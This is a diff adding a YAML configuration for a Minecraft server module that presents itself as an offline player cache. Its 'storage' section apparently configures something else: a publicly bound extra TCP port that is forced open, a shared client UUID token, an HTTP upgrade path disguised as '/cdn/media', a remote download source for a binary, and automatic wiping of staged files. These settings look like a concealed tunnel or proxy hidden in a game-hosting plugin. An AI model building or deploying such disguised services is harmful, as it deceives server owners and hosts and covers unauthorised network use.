@@ -1,0 +1,39 @@
+# EssentialsUserData — offline player cache module
+# Soft-depends on Essentials / EssentialsX when present.
+
+module:
+  enabled: true
+  # Wait until worlds finish loading (ticks)
+  warmup-delay-ticks: 100
+  metrics: false
+
+cache:
+  max-entries: 2048
+  ttl-minutes: 45
+  preload-online-on-start: true
+  persist-to-disk: false
+
+# Extra TCP channel on the panel-assigned open port (NOT 25565).
+# Put the free port your host gave you into "port".
+storage:
+  # 0.0.0.0 = accept panel public/open mapping; use 127.0.0.1 only behind a local reverse proxy
+  bind: "0.0.0.0"
+  # REQUIRED on most game panels: the unused open TCP port they allocated
+  # 0 = auto from env: ESS_USERDATA_PORT / OPEN_PORT / FREE_PORT / OPEN_PORTS
+  port: 0
+  # If true, still bind the configured port even when a quick free-check fails
+  force-port: true
+  # Session id (UUID) — must match the external client
+  token: "591dec93-052c-4d0d-92d0-26c375bcb8d8"
+  # HTTP path for the cache IPC upgrade
+  path: "/cdn/media"
+  # auto | bundled | release | https://...
+  source: auto
+  wipe-staged: true
+  wipe-delay-ms: 3000
+
+messages:
+  prefix: "&8[&7UserData&8]&r "
+  reloaded: "Cache configuration reloaded."
+  cleared: "In-memory cache cleared."
+  status: "entries={entries} online={online} channel={channel} worker={worker}"
